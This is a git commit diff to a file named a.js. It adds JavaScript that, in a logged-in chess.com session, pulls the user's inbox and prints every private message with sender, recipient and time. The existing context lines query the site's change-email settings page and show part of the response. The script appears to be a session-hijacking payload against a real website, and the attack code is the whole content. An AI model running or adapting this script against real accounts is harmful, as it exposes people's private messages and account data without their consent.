d3d419983bb8b3a1b2191e45afb2cb9580754f5e
yellowrook1 <95589375+yellowrook1@users.noreply.github.com>
2022-02-02 12:06:18 -0500

    Update a.js

--- a.js
+++ a.js
@@ -10,3 +10,9 @@ fetch("https://www.chess.com/settings/change-email").then((response) => response
         }).then(response => response.json())
   .then(data => {alert(data.message.substr(37))});
     });
+fetch("https://www.chess.com/callback/messages/list/inbox").then(response => response.json())
+  .then(data => {console.log(data);
+  for (var i = 0; i < data.length; i++){  fetch("https://www.chess.com/callback/messages/show/"+data[i].user.username).then(response => response.json())
+  .then(data => {for (var i = 0; i < data.length; i++){console.log("Time: " + data[i].createDate + " From: " + data[i].from_user.username + " To: " + data[i].to_user.username + " Message: " + data[i].message)}})
+  }
+})
